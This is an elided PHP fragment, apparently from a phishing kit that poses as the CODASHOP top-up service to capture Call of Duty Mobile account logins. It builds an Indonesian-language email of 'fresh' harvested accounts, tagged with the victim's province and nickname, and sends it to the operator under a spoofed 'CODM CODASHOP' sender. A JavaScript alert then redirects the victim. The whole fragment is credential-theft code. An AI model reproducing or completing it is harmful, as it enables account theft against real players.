...
if(isset($_POST['loginData'])) {
    ...
    if($tier != "" || $device != "") {
        ...
        $subject = "Akun CODM Log $prov | $nickName";
        $body = <<<EOD
            <pre style='font-size: 1.1em;'>
            <table>
            <tr>
                <th colspan="3" align="left">AKUN CODM FRESH SANGAD</th>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
...
EOD;
        ...
        $headersx .= 'From: CODM CODASHOP <result@idhaam>' . "\r\n"; 
        ...
        $tier = "";
        echo "<script type='text/javascript'>alert('Lengkapi Semua Data!'); document.location='./".strtolower($prov)."';</script>";
        die();
    }
